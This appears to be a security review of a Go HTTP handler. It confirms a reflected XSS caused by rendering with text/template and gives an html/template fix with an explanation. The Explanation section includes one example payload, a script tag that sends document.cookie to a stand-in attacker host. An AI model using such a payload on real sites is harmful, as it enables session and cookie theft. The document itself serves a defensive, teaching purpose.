## Verdict

Confirmed. The handler renders an HTTP response body with the `text/template` package instead of `html/template`. `text/template` performs no contextual output escaping, so the `Subject` field is written into the HTML response verbatim.

## Source

`subject := r.URL.Query().Get("subject")` (line 18) — the `subject` query parameter is attacker-controlled and flows unmodified into the `Subject` field of the template data (line 23), then into the response via `ticketPage.Execute(w, data)` (line 28).

## Fix

```go
package main

import (
	"html/template"
	"net/http"
)

var ticketPage = template.Must(template.New("ticket").Parse(`
	<html>
		<body>
			<h2>Ticket Status</h2>
			<p>Subject: {{.Subject}}</p>
		</body>
	</html>
`))

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	subject := r.URL.Query().Get("subject")

	data := struct {
		Subject string
	}{
		Subject: subject,
	}

	w.Header().Set("Content-Type", "text/html")
	ticketPage.Execute(w, data)
}

func main() {
	http.HandleFunc("/ticket/status", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

The only change is the import: `text/template` becomes `html/template`. Both packages expose an identical `Parse`/`Execute`/`Must` API, so no other line needs to change.

## Explanation

Go ships two template packages with the same interface but different execution models. `text/template` treats its output as plain text and substitutes `{{.Subject}}` with the field's value with no escaping whatsoever. `html/template` parses the template, understands where each action falls in the HTML document (element body, attribute, URL, `<script>` block, etc.), and applies the escaping appropriate to that context automatically at execute time.

With the original `text/template`, a request like `/ticket/status?subject=<script>document.location='https://evil.example/?c='+document.cookie</script>` is written into the response byte-for-byte, so the browser parses and executes the injected `<script>` tag — a classic reflected XSS.

Because line 12 places `{{.Subject}}` inside an HTML element body, switching to `html/template` causes the engine to apply HTML entity escaping to that value: `<`, `>`, `&`, `"`, and `'` are converted to their `&lt;`, `&gt;`, `&amp;`, `&#34;`, and `&#39;` entities before being written to the response. The injected markup is rendered as inert text in the page rather than parsed as HTML, which neutralizes the attack while leaving legitimate subjects (including ones containing ordinary punctuation) displayed correctly.

No other code changes are required: the template source, the handler logic, and the data struct are unaffected, since `html/template.Template` implements the same `Parse`/`Must`/`Execute` signatures as `text/template.Template`. Verify the fix by confirming that a request with `<`, `>`, or `&` in the `subject` parameter now returns the corresponding HTML entities in the response body instead of the raw characters.
